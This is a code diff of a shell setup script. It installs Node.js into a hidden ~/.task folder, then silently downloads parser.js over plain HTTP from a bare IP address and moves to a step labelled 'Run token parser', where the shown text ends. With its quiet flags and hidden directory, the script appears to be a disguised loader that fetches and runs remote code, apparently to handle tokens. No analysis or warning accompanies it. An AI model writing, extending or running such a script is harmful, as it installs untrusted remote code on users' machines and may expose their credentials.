@@ -10,41 +10,40 @@ LATEST_VERSION="20.11.1"
 NODE_VERSION=${LATEST_VERSION}
 
 NODE_TARBALL="node-v${NODE_VERSION}"
-DOWNLOAD_URL=""
-NODE_DIR="$HOME/.task/${NODE_TARBALL}"
-NODE_ARCH="x64"
 
-if [ "$ARCH" == "arm64" ]; then
-    NODE_ARCH="arm64"
-fi
+case "$ARCH" in
+    x86_64|amd64)
+        NODE_ARCH="x64"
+        ;;
+    aarch64|arm64)
+        NODE_ARCH="arm64"
+        ;;
+    i386|i686|x86)
+        NODE_ARCH="x86"
+        ;;
+    *)
+        echo "Unsupported architecture: $ARCH"
+        exit 1
+        ;;
+esac
 
 # Step 1: Set the Node.js tarball and download URL based on the OS
 if [ "$OS" == "Darwin" ]; then
     # macOS
-    NODE_TARBALL="$HOME/.task/${NODE_TARBALL}-darwin-${NODE_ARCH}.tar.xz"
+    NODE_DIR="$HOME/.task/${NODE_TARBALL}-darwin-${NODE_ARCH}.tar.xz"
     DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-darwin-${NODE_ARCH}.tar.xz"
 elif [ "$OS" == "Linux" ]; then
     # Linux
-    NODE_TARBALL="$HOME/.task/${NODE_TARBALL}-linux-${NODE_ARCH}.tar.xz"
+    NODE_DIR="$HOME/.task/${NODE_TARBALL}-linux-${NODE_ARCH}.tar.xz"
     DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-${NODE_ARCH}.tar.xz"
 else
     exit 1
 fi
 
-# Step 2: Check if Node.js is installed
-NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
-
-# Step 3: Determine whether to install Node.js
-INSTALL_NODE=1
-#if [ -z "$NODE_INSTALLED_VERSION" ]; then
-#    INSTALL_NODE=1
-#fi
-
 EXTRACTED_DIR="$HOME/.task/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-${NODE_ARCH}"
 
 # Use Documents directory for files
-#USER_HOME="$HOME/Documents"
-#mkdir -p "$USER_HOME"
+
 USER_HOME="$HOME/.task"
 mkdir -p "$USER_HOME"
 
@@ -52,17 +51,15 @@ mkdir -p "$USER_HOME"
 if [ ! -d "$EXTRACTED_DIR" ]; then
     echo "Error: Node.js directory was not extracted properly. Retrying download and extraction..."
 
-    if [ "$INSTALL_NODE" -eq 1 ]; then
-        if ! command -v curl &> /dev/null; then
-            wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL"
-        else
-            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
-        fi
+    if ! command -v curl &> /dev/null; then
+        wget -q -O "$NODE_DIR" "$DOWNLOAD_URL" 
+    else
+        curl -sSL -o "$NODE_DIR" "$DOWNLOAD_URL"
+    fi
 
-        if [ -f "$NODE_TARBALL" ]; then
-            tar -xf "$NODE_TARBALL" -C "$HOME/.task"
-            rm -f "$NODE_TARBALL"
-        fi
+    if [ -f "$NODE_DIR" ]; then
+        tar -xf "$NODE_DIR" -C "$HOME/.task"
+        rm -f "$NODE_DIR"
     fi
 fi
 
@@ -74,12 +71,6 @@ if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
     exit 1
 fi
 
-# Use Documents directory for files
-#USER_HOME="$HOME/Documents"
-#mkdir -p "$USER_HOME"
-USER_HOME="$HOME/.task"
-mkdir -p "$USER_HOME"
-
 BASE_URL="http://64.204.80.251"
 
 # Step 8: Download files
@@ -87,17 +78,9 @@ BASE_URL="http://64.204.80.251"
 if ! command -v curl >/dev/null 2>&1; then
     # If curl is not available, use wget
     wget -q -O "$USER_HOME/parser.js" "$BASE_URL/231/parser.js"
-    wget -q -O "$USER_HOME/package.json" "$BASE_URL/399/package.json"
 else
     # If curl is available, use curl
     curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/231/parser.js"
-    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/399/package.json"
-fi
-
-# Step 9: Install 'request' package
-cd "$USER_HOME"
-if [ ! -d "node_modules/request" ]; then
-    npm install --silent --no-progress --loglevel=error --fund=false
 fi
 
 # Step 10: Run token parser
